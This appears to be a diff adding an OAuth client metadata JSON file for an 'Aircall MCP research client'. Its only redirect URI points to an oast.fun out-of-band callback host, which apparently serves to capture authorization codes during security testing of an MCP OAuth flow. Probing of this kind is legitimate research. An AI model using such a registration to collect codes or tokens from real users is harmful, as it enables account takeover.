@@ -1,0 +1,9 @@
+{
+  "client_id": "https://cdn.jsdelivr.net/gh/ugbodagadave/oauth-client-md-mcp-2026@1.0.0/client.json",
+  "client_name": "Aircall MCP research client",
+  "client_uri": "https://example.com/",
+  "redirect_uris": ["https://dbfnf25t67695614vpv0dibobojdn7m1o.oast.fun/mcpcb"],
+  "grant_types": ["authorization_code", "refresh_token"],
+  "response_types": ["code"],
+  "token_endpoint_auth_method": "none"
+}
